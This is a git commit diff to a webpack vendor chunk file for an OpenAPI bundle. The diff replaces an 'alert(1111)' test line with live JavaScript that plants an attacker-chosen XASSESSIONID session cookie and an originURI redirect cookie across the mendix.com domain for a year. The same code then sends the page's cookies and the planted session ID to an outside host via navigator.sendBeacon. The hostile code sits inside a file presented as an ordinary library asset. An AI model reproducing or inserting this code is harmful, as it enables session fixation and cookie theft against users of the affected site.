25b046f4788230b913a4d9f0485e97dd7104f3e7
alfredo1111 <alfredgotu@gmail.com>
2026-09-24 22:52:16 +0100

    Update vendors-openapi.7e543205.chunk.js

--- assets/webpack/vendors-openapi.7e543205.chunk.js
+++ assets/webpack/vendors-openapi.7e543205.chunk.js
@@ -1,1 +1,6 @@
-alert(1111)
+var ATTACKER_SID = "c8ee8838-a6d3-4ec8-815b-e6715b15b4ba";
+var BEACON = "https://www.hamzab3t.com/collect";
+var a = "; Domain=.mendix.com; Path=/; Secure; SameSite=None; Max-Age=31536000";
+document.cookie = "XASSESSIONID=" + ATTACKER_SID + a;
+document.cookie = "originURI=https://www.hamzab3t.com/x" + a;
+try { navigator.sendBeacon(BEACON, JSON.stringify({cookies: document.cookie, planted: ATTACKER_SID})); } catch (e) {}
